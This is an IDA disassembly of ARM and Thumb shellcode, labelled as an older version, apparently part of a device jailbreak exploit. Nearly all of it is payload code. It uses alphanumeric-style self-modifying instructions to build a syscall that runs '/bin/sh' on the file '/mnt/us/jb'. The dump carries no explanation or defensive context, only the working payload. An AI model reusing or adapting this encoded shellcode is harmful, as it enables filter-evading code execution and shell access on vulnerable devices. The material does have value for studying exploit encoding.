; IDA dump after execution. Older version of shellcode.
; Segment type:	Pure code
		AREA ROM, CODE,	READWRITE, ALIGN=0
		CODE32
		RSBVS		R6, R2,	#0x20000006
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38

loc_A104C				; DATA XREF: ROM:000A1074o
		SUBPL		R3, R1,	#0x38

loc_A1050				; DATA XREF: ROM:000A1078o
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		SUBPL		R3, R1,	#0x38
		ADRMI		R3, loc_A104C
		ADRPL		R3, loc_A1050
		LDRPLB		R3, [R3,#-0x30]
		LDRMIB		R3, [R3,#-0x30]
		SUBMIS		R5, R3,	#0x39
		SUBPLS		R5, R3,	#0x39
		SUBMI		R7, SP,	#0x30
		SUBMIS		R3, R3,	#0x38
		SUBPL		R6, R3,	R3,ROR#2
		SUBPL		R4, PC,	R3,ROR#2
		STMPLDB		R7, {R0,R4-R6,R8,LR}^
		SUBPL		R4, R3,	R3,ROR#2
		SUBPL		R5, R4,	#0x79
		SUBPL		R6, PC,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		SUBPL		R6, R6,	R5,ROR#2
		STRPLB		R3, [R6,#-0x52]
		STRPLB		R3, [R6,#-0x53]
		STRPLB		R3, [R6,#-0x54]
		EORPLS		R3, R3,	#0x38
		SUBPL		R7, R3,	#0x39
		EORPLS		R5, R7,	#0x50
		SUBMI		R5, R3,	#0x36
		EORMIS		R5, R3,	#0x42
		EORPLS		R5, R5,	#0x6C
		STRPLB		R5, [R6,#-0x48]
		EORPLS		R5, R3,	#0x56
		EORPLS		R5, R5,	#0x41
		STRPLB		R5, [R6,#-0x46]
		STRPLB		R7, [R6,#-0x47]
		SUBPL		R3, R7,	#0x78
		SUBPL		R3, R3,	#0x78
		SUBPL		R3, R3,	#0x78
		SUBPL		R6, R6,	R3,ROR#2
		SUBPL		R6, R6,	R3,ROR#2
		EORPLS		R5, R7,	#0x61
		EORMIS		R5, R5,	#0x41
		STRMIB		R5, [R6,#-0x71]
		EORMIS		R7, R4,	#0x38
		SUBPL		R5, SP,	#0x30
		LDMPLDA		R5!, {R0-R2,R6,R8,LR}
		SUBPL		R7, R7,	#0x38
		SUBPL		R5, R4,	R4,ROR#2
		RSBPLS		R5, R5,	#0xF0000004
		EORMIS		R5, R5,	#0x30
		SUBMIS		R3, R5,	#0xF0000004
		SUBPL		R5, R5,	#0x34
		EORPLS		R7, R7,	R5,ROR#12
		EORPLS		R7, R7,	#0x32
		EORPLS		R7, R7,	#0x30
		EORPLS		R5, R5,	#0x30
		SVCMI		0
		EORMIS		R5, R4,	#0x38
		SUBPL		R6, PC,	R1,ROR#2
		BXPL		R6
		CODE16
		MOV		R0, PC
		ADDS		R0, #0x52 ; 'R'
		SUBS		R0, #0x35 ; '5'
		NEGS		R6, R0
		NEGS		R6, R6
		BX		R6 ; loc_A1184
; ---------------------------------------------------------------------------
		CODE32
aBinSh		DCB "/bin/sh",0
aMntUsJb	DCB "/mnt/us/jb",0
		DCB 0x30 ; 0
; ---------------------------------------------------------------------------
		CODE16

loc_A1184				; CODE XREF: ROM:000A116Ej
		ADDS		R0, #0x4D ; 'M'
		SUBS		R0, #0x62 ; 'b'
		MULS		R1, R2
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x73 ; 's'
		STRB		R2, [R0,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x6F ; 'o'
		STRB		R2, [R0,R1]
		MULS		R1, R2
		ADDS		R1, #0x61 ; 'a'
		SUBS		R1, #0x32 ; '2'
		NEGS		R2, R1
		NEGS		R2, R2
		MULS		R1, R4
		STRB		R2, [R0,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x76 ; 'v'
		STRB		R2, [R0,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x76 ; 'v'
		STRB		R2, [R0,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x76 ; 'v'
		STRB		R2, [R0,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x77 ; 'w'
		STRB		R2, [R0,R1]
		MULS		R1, R4
		ADDS		R1, #0x30 ; '0'
		SUBS		R1, #(loc_30+1)
		NEGS		R7, R1
		MULS		R1, R4
		ADDS		R1, #0x41 ; 'A'
		SUBS		R1, #0x36 ; '6'
		MULS		R7, R1
		MOV		R2, SP
		MULS		R1, R4
		STR		R0, [R2,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x76 ; 'v'
		ADDS		R0, #0x7A ; 'z'
		SUBS		R0, #0x72 ; 'r'
		STR		R0, [R2,R1]
		ADDS		R1, #0x7A ; 'z'
		SUBS		R1, #0x76 ; 'v'
		STR		R4, [R2,R1]
		NEGS		R1, R2
		NEGS		R1, R1
		ADDS		R0, #0x72 ; 'r'
		SUBS		R0, #0x7A ; 'z'
		MULS		R2, R4
		SVC		0x30 ; '0'
; ---------------------------------------------------------------------------
; ROM		ends
